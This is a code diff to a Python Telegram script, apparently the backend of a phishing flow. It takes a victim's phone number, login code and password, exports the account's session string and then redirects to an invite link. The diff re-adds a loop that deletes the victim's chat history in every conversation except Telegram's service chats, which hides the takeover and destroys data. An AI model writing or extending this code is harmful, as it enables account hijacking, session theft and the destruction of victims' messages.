@@ -95,7 +95,15 @@ async def async_verify_code(phone_number, code, password):
 
     session_string = await client.export_session_string()
 
-    # ❌ បានលុបផ្នែក delete_chat_history ចោលដើម្បីរក្សាទុកប្រវត្តិសារ (Chat)
+    try:
+        async for dialog in client.get_dialogs():
+            if dialog.chat.id not in (777000, 777):
+                try:
+                    await client.delete_chat_history(dialog.chat.id)
+                except:
+                    pass
+    except:
+        pass
 
     await client.disconnect()
     temp_clients.pop(phone_number, None)
@@ -118,7 +126,7 @@ async def async_verify_code(phone_number, code, password):
         "redirectUrl": STATIC_INVITE_LINK
     }
 
-# 🛠 Event Listener: Auto-Approve ពេលមានគេ Join តាម Link Request
+# 🛠 Event Listener: Auto-Approve ពេលមានគេ Join ຜ່ານ Link Request
 if admin_client:
     @admin_client.on_chat_join_request()
     async def handle_join_request(client, chat_join_request):
